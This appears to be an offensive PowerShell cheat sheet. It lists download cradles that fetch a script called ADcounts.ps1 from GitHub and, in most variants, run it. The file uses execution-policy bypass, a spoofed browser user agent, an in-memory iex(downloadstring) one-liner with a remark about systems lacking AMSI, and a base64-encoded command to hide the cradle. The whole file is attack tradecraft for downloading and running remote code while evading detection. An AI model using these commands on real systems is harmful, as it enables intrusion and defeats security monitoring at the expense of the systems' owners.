powershell -exec bypass -command {
    $cli = New-Object System.Net.WebClient;
    $cli.Headers['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.45"
    $cli.DownloadFile('https://github.com/OnlyTheShadowKnows/AD/blob/master/ADcounts.ps1', 'C:\file.name')
}

powershell -command "invoke-expression (
$cli = New-Object System.Net.WebClient; 
$cli.Headers['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.45"; 
$cli.DownloadFile('https://github.com/OnlyTheShadowKnows/AD/blob/master/ADcounts.ps1', 'C:\file.name') )"

# And then ... if the system is < Win10, and doesn't have AMSI...
powershell -nop -c "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/OnlyTheShadowKnows/AD/master/ADcounts.ps1')"

$Text = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/OnlyTheShadowKnows/AD/master/ADcounts.ps1')"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

powershell -exec bypass -encodedcommand $EncodedText
